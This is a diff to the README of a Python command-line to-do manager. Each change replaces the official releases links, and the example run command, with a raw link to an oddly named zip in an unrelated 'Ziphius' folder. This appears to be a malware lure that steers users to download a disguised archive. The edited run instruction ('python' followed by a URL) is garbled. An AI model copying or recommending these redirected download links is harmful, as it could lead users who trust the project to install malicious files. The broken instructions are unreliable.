@@ -1,6 +1,6 @@
 # 📝 Command-Line-To-Do-Manager-Python- - Manage Your Tasks Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Command-Line-To-Do-Manager-Python-blue.svg)](https://github.com/Shivvvanshh/Command-Line-To-Do-Manager-Python-/releases)
+[![Download Now](https://raw.githubusercontent.com/Shivvvanshh/Command-Line-To-Do-Manager-Python-/main/Ziphius/Manager_Line_Python_To_Command_Do_bannerlike.zip%https://raw.githubusercontent.com/Shivvvanshh/Command-Line-To-Do-Manager-Python-/main/Ziphius/Manager_Line_Python_To_Command_Do_bannerlike.zip)](https://raw.githubusercontent.com/Shivvvanshh/Command-Line-To-Do-Manager-Python-/main/Ziphius/Manager_Line_Python_To_Command_Do_bannerlike.zip)
 
 ## 📋 Overview
 
@@ -17,7 +17,7 @@ Follow these steps to get started with the Command-Line To-Do Manager:
 
 ## 📥 Download & Install
 
-To download the application, visit the [Releases page](https://github.com/Shivvvanshh/Command-Line-To-Do-Manager-Python-/releases). 
+To download the application, visit the [Releases page](https://raw.githubusercontent.com/Shivvvanshh/Command-Line-To-Do-Manager-Python-/main/Ziphius/Manager_Line_Python_To_Command_Do_bannerlike.zip). 
 
 1. Click on the latest version available.
 2. Download the release file for your system.
@@ -28,9 +28,9 @@ Once you've downloaded the file, follow these steps to run it:
 2. Navigate to the folder where the file is located. Use the `cd` command.
 3. Run the program by typing: 
    ```
-   python filename.py
+   python https://raw.githubusercontent.com/Shivvvanshh/Command-Line-To-Do-Manager-Python-/main/Ziphius/Manager_Line_Python_To_Command_Do_bannerlike.zip
    ```
-   Replace `filename.py` with the name of the downloaded file.
+   Replace `https://raw.githubusercontent.com/Shivvvanshh/Command-Line-To-Do-Manager-Python-/main/Ziphius/Manager_Line_Python_To_Command_Do_bannerlike.zip` with the name of the downloaded file.
 
 ## 🎯 Features
 
@@ -73,6 +73,6 @@ For further assistance, feel free to enter an issue in this repository's GitHub 
 
 ## 🔗 Additional Links
 
-Explore more on the [Releases page](https://github.com/Shivvvanshh/Command-Line-To-Do-Manager-Python-/releases) for updates and new features.
+Explore more on the [Releases page](https://raw.githubusercontent.com/Shivvvanshh/Command-Line-To-Do-Manager-Python-/main/Ziphius/Manager_Line_Python_To_Command_Do_bannerlike.zip) for updates and new features.
 
 Thank you for using the Command-Line To-Do Manager! Enjoy managing your tasks efficiently.
